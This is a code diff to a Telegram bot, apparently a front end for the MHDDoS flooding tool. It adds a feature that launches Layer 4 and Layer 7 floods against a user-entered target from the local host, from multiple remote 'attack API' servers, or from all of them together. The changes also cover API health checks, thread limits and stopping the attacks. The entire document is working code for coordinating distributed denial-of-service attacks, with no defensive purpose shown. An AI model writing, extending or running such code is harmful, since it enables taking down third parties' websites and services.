@@ -178,6 +178,22 @@ class ConversationState(Enum):
     SELECT_ATTACK_MODE = auto()  # State for selecting local vs API attack
 
 
+# Attack mode constants and display names
+ATTACK_MODE_LOCAL = "local"
+ATTACK_MODE_API = "api"
+ATTACK_MODE_ALL = "all"
+
+ATTACK_MODE_NAMES = {
+    ATTACK_MODE_LOCAL: "🖥️ Local",
+    ATTACK_MODE_API: "🌐 API Only",
+    ATTACK_MODE_ALL: "🔀 All (Local + API)"
+}
+
+CALLBACK_TO_MODE = {
+    "attack_mode_local": ATTACK_MODE_LOCAL,
+    "attack_mode_api": ATTACK_MODE_API,
+    "attack_mode_all": ATTACK_MODE_ALL
+}
 @dataclass
 class AttackConfig:
     """Configuration for an attack session."""
@@ -189,6 +205,7 @@ class AttackConfig:
     rpc: int = 1
     proxy_type: int = 0
     is_layer7: bool = True
+    attack_mode: str = "local"  # "local", "api", or "all"
     
     # Default values stored as class attribute for consistency
     _defaults = {
@@ -200,6 +217,7 @@ class AttackConfig:
         "rpc": 1,
         "proxy_type": 0,
         "is_layer7": True,
+        "attack_mode": "local",
     }
     
     def reset(self):
@@ -217,12 +235,17 @@ class AttackConfig:
             duration=self.duration,
             rpc=self.rpc,
             proxy_type=self.proxy_type,
-            is_layer7=self.is_layer7
+            is_layer7=self.is_layer7,
+            attack_mode=self.attack_mode
         )
     
-    def validate(self) -> Tuple[bool, str]:
+    def validate(self, custom_max_threads: int = 0) -> Tuple[bool, str]:
         """
         Validate the attack configuration.
+        
+        Args:
+            custom_max_threads: Custom max threads limit. When > 0, uses this value
+                              instead of SYSTEM_MAX_THREADS for validation.
         
         Returns:
             Tuple of (is_valid, error_message)
@@ -236,8 +259,12 @@ class AttackConfig:
         if self.threads < 1:
             return False, "Thread count must be at least 1"
         
-        if self.threads > SYSTEM_MAX_THREADS:
-            return False, f"Thread count exceeds system limit ({SYSTEM_MAX_THREADS}). Please use a lower value."
+        # Only validate thread limit for local attacks
+        # For API-only attacks, the API servers handle their own limits
+        if self.attack_mode in (ATTACK_MODE_LOCAL, ATTACK_MODE_ALL):
+            max_limit = custom_max_threads if custom_max_threads > 0 else SYSTEM_MAX_THREADS
+            if self.threads > max_limit:
+                return False, f"Thread count exceeds system limit ({max_limit}). Please use a lower value."
         
         if self.duration < 1:
             return False, "Duration must be at least 1 second"
@@ -263,6 +290,8 @@ class AttackSession:
     monitor_task: Optional[asyncio.Task] = None
     error_count: int = 0  # Track errors during attack
     last_error: str = ""  # Last error message
+    attack_mode: str = "local"  # "local", "api", or "all"
+    api_attack_ids: Dict[str, str] = field(default_factory=dict)  # api_name -> attack_id
 
 
 @dataclass
@@ -1010,10 +1039,11 @@ class MHDDoSBot:
         layer = "Layer 7" if config.is_layer7 else "Layer 4"
         proxy_names = {0: "All", 1: "HTTP", 4: "SOCKS4", 5: "SOCKS5", 6: "Random", -1: "None"}
         proxy = proxy_names.get(config.proxy_type, str(config.proxy_type))
+        mode = ATTACK_MODE_NAMES.get(config.attack_mode, config.attack_mode)
         
-        # Add warning if threads exceed recommended limit
+        # Add warning if threads exceed recommended limit (only for local/all modes)
         thread_warning = ""
-        if config.threads > SYSTEM_MAX_THREADS * 0.8:
+        if config.attack_mode in (ATTACK_MODE_LOCAL, ATTACK_MODE_ALL) and config.threads > SYSTEM_MAX_THREADS * 0.8:
             thread_warning = f"\n⚠️ High thread count (limit: {SYSTEM_MAX_THREADS})"
         
         summary = f"""
@@ -1021,6 +1051,7 @@ class MHDDoSBot:
 ------------------------
 🎯 Layer: {layer}
 ⚡ Method: {config.method}
+🎮 Mode: {mode}
 🌐 Target: {config.target}
 🔌 Port: {config.port}
 🧵 Threads: {config.threads}{thread_warning}
@@ -1163,8 +1194,29 @@ Select an option from the menu below to begin.
                 session.is_running = False
                 if session.monitor_task and not session.monitor_task.done():
                     session.monitor_task.cancel()
+                
+                # Stop API attacks if any
+                api_stop_results = []
+                if session.api_attack_ids:
+                    for api_name, attack_id in session.api_attack_ids.items():
+                        for api in self.attack_apis:
+                            if api.name == api_name:
+                                success, msg = stop_api_attack(api, attack_id)
+                                api_stop_results.append((api_name, success))
+                                break
+                
                 del self.active_sessions[user_id]
-                await update.message.reply_text("🛑 Attack stopped.", reply_markup=self.get_main_menu_keyboard())
+                
+                # Build stop message
+                stop_msg = "🛑 Attack stopped."
+                if api_stop_results:
+                    api_details = []
+                    for api_name, success in api_stop_results:
+                        status = "✅" if success else "⚠️"
+                        api_details.append(f"{status} {api_name}")
+                    stop_msg += f"\n\n📊 API Status:\n" + "\n".join(api_details)
+                
+                await update.message.reply_text(stop_msg, reply_markup=self.get_main_menu_keyboard())
             else:
                 await update.message.reply_text("📭 No active attacks to stop.", reply_markup=self.get_main_menu_keyboard())
         except Exception as e:
@@ -1550,16 +1602,36 @@ Step 1/3: Enter a name for this API (e.g., "server1"):
                     if session.last_error:
                         error_info += f"\n📛 Last: {session.last_error[:50]}"
                 
+                # Attack mode info
+                mode_info = ATTACK_MODE_NAMES.get(session.attack_mode, session.attack_mode)
+                
+                # API attack status
+                api_status = ""
+                if session.api_attack_ids:
+                    api_status = "\n\n🌐 API Attacks:"
+                    for api_name, attack_id in session.api_attack_ids.items():
+                        for api in self.attack_apis:
+                            if api.name == api_name:
+                                status_info = get_api_attack_status(api, attack_id)
+                                if status_info.get("success"):
+                                    api_data = status_info.get("status", {})
+                                    api_progress = api_data.get("progress", 0)
+                                    api_status += f"\n• {api_name}: {api_progress}%"
+                                else:
+                                    api_status += f"\n• {api_name}: ⚠️ Status unavailable"
+                                break
+                
                 status_text = f"""
 📊 Attack Status:
 -----------------
 🎯 Target: {session.config.target}
 ⚡ Method: {session.config.method}
+🎮 Mode: {mode_info}
 ⏱️ Elapsed: {elapsed}s
 ⏳ Remaining: {remaining}s
 📈 Progress: [{progress_bar}] {progress}%
 📤 PPS: {Tools.humanformat(int(REQUESTS_SENT))}
-📦 BPS: {Tools.humanbytes(int(BYTES_SEND))}{error_info}
+📦 BPS: {Tools.humanbytes(int(BYTES_SEND))}{error_info}{api_status}
 """
                 await self.safe_edit_message(
                     query,
@@ -1607,14 +1679,42 @@ Use inline buttons to navigate and configure attacks.
             )
             return ConversationState.MAIN_MENU.value
         
-        # Method selection
+        # Method selection - now asks for attack mode first if APIs are configured
         elif data.startswith("method_"):
             method = data.replace("method_", "")
             config.method = method
+            
+            # Check if there are enabled APIs
+            enabled_apis = self.get_enabled_apis()
+            if enabled_apis:
+                # Show attack mode selection FIRST
+                await self.safe_edit_message(
+                    query,
+                    f"⚡ Method: {method}\n\n🎯 Select attack mode:\n\n"
+                    f"• 🖥️ Local: Attack from this server only\n"
+                    f"• 🌐 API: Attack from {len(enabled_apis)} API servers\n"
+                    f"• 🔀 All: Attack from this server + all APIs",
+                    reply_markup=self.get_attack_mode_keyboard()
+                )
+                return ConversationState.SELECT_ATTACK_MODE.value
+            else:
+                # No APIs configured, continue with local attack
+                config.attack_mode = ATTACK_MODE_LOCAL
+                self.user_state_context[user_id] = "enter_target"
+                await self.safe_edit_message(
+                    query,
+                    f"⚡ Method: {method}\n\n📝 Enter target URL/IP:"
+                )
+                return ConversationState.ENTER_TARGET.value
+        
+        # Attack mode selection - then continue to target entry
+        elif data in CALLBACK_TO_MODE:
+            config.attack_mode = CALLBACK_TO_MODE[data]
+            
             self.user_state_context[user_id] = "enter_target"
             await self.safe_edit_message(
                 query,
-                f"⚡ Method: {method}\n\n📝 Enter target URL/IP:"
+                f"⚡ Method: {config.method}\n🎮 Mode: {ATTACK_MODE_NAMES[config.attack_mode]}\n\n📝 Enter target URL/IP:"
             )
             return ConversationState.ENTER_TARGET.value
         
@@ -1623,18 +1723,23 @@ Use inline buttons to navigate and configure attacks.
             value = data.replace("threads_", "")
             if value == "custom":
                 self.user_state_context[user_id] = "enter_threads"
+                # Show appropriate limit based on attack mode
+                if config.attack_mode == ATTACK_MODE_API:
+                    limit_msg = "ℹ️ API servers will enforce their own limits"
+                else:
+                    limit_msg = f"⚠️ Local system max: {SYSTEM_MAX_THREADS}"
                 await self.safe_edit_message(
                     query,
-                    f"📝 Enter custom thread count:\n\n⚠️ System max: {SYSTEM_MAX_THREADS}"
+                    f"📝 Enter custom thread count:\n\n{limit_msg}"
                 )
                 return ConversationState.ENTER_THREADS.value
             else:
                 thread_count = int(value)
-                # Validate against system limit
-                if thread_count > SYSTEM_MAX_THREADS:
+                # Only validate against local system limit for local/all modes
+                if config.attack_mode in (ATTACK_MODE_LOCAL, ATTACK_MODE_ALL) and thread_count > SYSTEM_MAX_THREADS:
                     await self.safe_edit_message(
                         query,
-                        f"⚠️ {thread_count} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\nPlease select a lower value:",
+                        f"⚠️ {thread_count} threads exceeds local system limit ({SYSTEM_MAX_THREADS}).\n\nPlease select a lower value:",
                         reply_markup=self.get_threads_keyboard()
                     )
                     return ConversationState.ENTER_THREADS.value
@@ -1726,7 +1831,7 @@ Use inline buttons to navigate and configure attacks.
             )
             return ConversationState.CONFIRM_ATTACK.value
         
-        # Confirmation
+        # Confirmation - attack mode is already set earlier in the flow
         elif data == "confirm_start":
             # Validate config before starting
             is_valid, error_msg = config.validate()
@@ -1738,7 +1843,8 @@ Use inline buttons to navigate and configure attacks.
                 )
                 return ConversationState.MAIN_MENU.value
             
-            await self.start_attack(query, user_id, config)
+            # Start attack with the attack_mode already set in config
+            await self.start_attack(query, user_id, config, attack_mode=config.attack_mode)
             return ConversationState.MAIN_MENU.value
         
         elif data == "confirm_cancel":
@@ -1758,10 +1864,31 @@ Use inline buttons to navigate and configure attacks.
                 session.is_running = False
                 if session.monitor_task and not session.monitor_task.done():
                     session.monitor_task.cancel()
+                
+                # Stop API attacks if any
+                api_stop_results = []
+                if session.api_attack_ids:
+                    for api_name, attack_id in session.api_attack_ids.items():
+                        for api in self.attack_apis:
+                            if api.name == api_name:
+                                success, msg = stop_api_attack(api, attack_id)
+                                api_stop_results.append((api_name, success))
+                                break
+                
                 del self.active_sessions[user_id]
+                
+                # Build stop message
+                stop_msg = "🛑 Attack stopped."
+                if api_stop_results:
+                    api_details = []
+                    for api_name, success in api_stop_results:
+                        status = "✅" if success else "⚠️"
+                        api_details.append(f"{status} {api_name}")
+                    stop_msg += f"\n\n📊 API Status:\n" + "\n".join(api_details)
+                
                 await self.safe_edit_message(
                     query,
-                    "🛑 Attack stopped.\n\n🏠 Main Menu:",
+                    stop_msg + "\n\n🏠 Main Menu:",
                     reply_markup=self.get_main_menu_keyboard()
                 )
             else:
@@ -2023,10 +2150,11 @@ Step 3/3: Enter API key (or type 'none' for no key):
                 if value < 1:
                     await self.safe_reply(update.message, "⚠️ Thread count must be at least 1. Enter thread count:")
                     return ConversationState.ENTER_THREADS.value
-                if value > SYSTEM_MAX_THREADS:
+                # Only validate against local limit for local/all modes
+                if config.attack_mode in (ATTACK_MODE_LOCAL, ATTACK_MODE_ALL) and value > SYSTEM_MAX_THREADS:
                     await self.safe_reply(
                         update.message,
-                        f"⚠️ {value} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\n📝 Enter a lower value:"
+                        f"⚠️ {value} threads exceeds local system limit ({SYSTEM_MAX_THREADS}).\n\n📝 Enter a lower value:"
                     )
                     return ConversationState.ENTER_THREADS.value
                 
@@ -2107,10 +2235,11 @@ Step 3/3: Enter API key (or type 'none' for no key):
             
             # Could be threads, duration, or RPC - determine from defaults
             if config.threads == 100:  # Default, likely entering custom threads
-                if value > SYSTEM_MAX_THREADS:
+                # Only validate against local limit for local/all modes
+                if config.attack_mode in (ATTACK_MODE_LOCAL, ATTACK_MODE_ALL) and value > SYSTEM_MAX_THREADS:
                     await self.safe_reply(
                         update.message,
-                        f"⚠️ {value} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\n📝 Enter a lower value:"
+                        f"⚠️ {value} threads exceeds local system limit ({SYSTEM_MAX_THREADS}).\n\n📝 Enter a lower value:"
                     )
                     return ConversationState.ENTER_THREADS.value
                 
@@ -2318,7 +2447,7 @@ Step 3/3: Enter API key (or type 'none' for no key):
                 reply_markup=self.get_tools_keyboard()
             )
     
-    async def start_attack(self, query, user_id: int, config: AttackConfig) -> None:
+    async def start_attack(self, query, user_id: int, config: AttackConfig, attack_mode: str = "local") -> None:
         """Start the attack with given configuration."""
         # Validate configuration
         is_valid, error_msg = config.validate()
@@ -2337,13 +2466,21 @@ Step 3/3: Enter API key (or type 'none' for no key):
             old_session.is_running = False
             if old_session.monitor_task and not old_session.monitor_task.done():
                 old_session.monitor_task.cancel()
+            # Stop API attacks if any
+            if old_session.api_attack_ids:
+                for api_name, attack_id in old_session.api_attack_ids.items():
+                    for api in self.attack_apis:
+                        if api.name == api_name:
+                            stop_api_attack(api, attack_id)
+                            break
         
         event = Event()
         
         session = AttackSession(
             config=config.copy(),
             event=event,
-            start_time=time()
+            start_time=time(),
+            attack_mode=attack_mode
         )
         
         self.active_sessions[user_id] = session
@@ -2355,13 +2492,51 @@ Step 3/3: Enter API key (or type 'none' for no key):
         try:
             await self.safe_edit_message(query, "🚀 Starting attack... Please wait.")
             
-            if config.is_layer7:
-                await self._start_layer7_attack(query, session)
-            else:
-                await self._start_layer4_attack(query, session)
+            # Determine what to start based on attack mode
+            api_results = []
+            local_started = False
+            
+            if attack_mode in (ATTACK_MODE_API, ATTACK_MODE_ALL):
+                # Start API attacks
+                api_results = await self._start_api_attacks(session, config)
+            
+            if attack_mode in (ATTACK_MODE_LOCAL, ATTACK_MODE_ALL):
+                # Start local attack
+                if config.is_layer7:
+                    await self._start_layer7_attack(query, session)
+                else:
+                    await self._start_layer4_attack(query, session)
+                local_started = True
+            
+            # Build result message
+            result_parts = []
+            
+            if local_started:
+                result_parts.append(f"🖥️ Local: Started with {len(session.threads)} threads")
+            
+            for api_name, success, msg in api_results:
+                status = "✅" if success else "❌"
+                result_parts.append(f"{status} {api_name}: {msg}")
+            
+            if not result_parts:
+                raise BotError("No attacks were started")
             
             # Start monitoring task and store reference for cleanup
             session.monitor_task = asyncio.create_task(self._monitor_attack(query, user_id, session))
+            
+            # Show success message
+            msg = (
+                f"🚀 Attack Started!\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"🎯 Target: {config.target}\n"
+                f"⚡ Method: {config.method}\n"
+                f"🎮 Mode: {ATTACK_MODE_NAMES.get(attack_mode, attack_mode)}\n"
+                f"⏱️ Duration: {config.duration}s\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📊 Results:\n" + "\n".join(result_parts) + "\n\n"
+                f"Use 🔄 Refresh Status to see progress."
+            )
+            await self.safe_edit_message(query, msg, reply_markup=self.get_stop_keyboard())
             
         except Exception as e:
             logger.error(f"Attack failed to start: {e}\n{traceback.format_exc()}")
@@ -2374,6 +2549,78 @@ Step 3/3: Enter API key (or type 'none' for no key):
                 f"⚠️ Attack failed to start:\n{str(e)}\n\n🏠 Main Menu:",
                 reply_markup=self.get_main_menu_keyboard()
             )
+    
+    async def _start_api_attacks(self, session: AttackSession, config: AttackConfig) -> List[Tuple[str, bool, str]]:
+        """
+        Start attacks on all enabled APIs simultaneously.
+        
+        Returns:
+            List of (api_name, success, message) tuples
+        """
+        enabled_apis = self.get_enabled_apis()
+        if not enabled_apis:
+            return []
+        
+        # First, check health of all APIs and get their max_threads
+        api_health_info = {}
+        healthy_apis = []
+        
+        for api in enabled_apis:
+            is_healthy, health_info = check_api_health(api)
+            if is_healthy:
+                api.is_healthy = True
+                api.max_threads = health_info.get("max_threads", 0)
+                api_health_info[api.name] = health_info
+                healthy_apis.append(api)
+            else:
+                api.is_healthy = False
+                logger.warning(f"API {api.name} is unhealthy: {health_info.get('error', 'Unknown')}")
+        
+        if not healthy_apis:
+            return [(api.name, False, "Unhealthy") for api in enabled_apis]
+        
+        # Calculate minimum max_threads across all healthy APIs
+        # Get list of positive max_threads values
+        api_max_threads = [api.max_threads for api in healthy_apis if api.max_threads > 0]
+        
+        # Use minimum from APIs if available, otherwise use config threads
+        if api_max_threads:
+            min_max_threads = min(api_max_threads)
+            adjusted_threads = min(config.threads, min_max_threads)
+        else:
+            adjusted_threads = config.threads
+        
+        if adjusted_threads < config.threads:
+            logger.info(f"Adjusted threads from {config.threads} to {adjusted_threads} due to API limits")
+        
+        # Prepare attack config for APIs
+        # Use the target as-is if it already has a scheme, otherwise add http://
+        target_url = config.target if config.target.startswith("http") else f"http://{config.target}"
+        
+        api_config = {
+            "method": config.method,
+            "target": target_url,
+            "port": config.port,
+            "threads": adjusted_threads,
+            "duration": config.duration,
+            "rpc": config.rpc,
+            "is_layer7": config.is_layer7,
+        }
+        
+        # Start attacks on all healthy APIs
+        results = []
+        for api in healthy_apis:
+            success, message, attack_id = start_api_attack(api, api_config.copy())
+            if success and attack_id:
+                session.api_attack_ids[api.name] = attack_id
+            results.append((api.name, success, message if success else f"Failed: {message}"))
+        
+        # Add unhealthy APIs to results
+        for api in enabled_apis:
+            if api not in healthy_apis:
+                results.append((api.name, False, "Unhealthy - skipped"))
+        
+        return results
     
     async def _start_layer7_attack(self, query, session: AttackSession) -> None:
         """Start Layer 7 attack."""
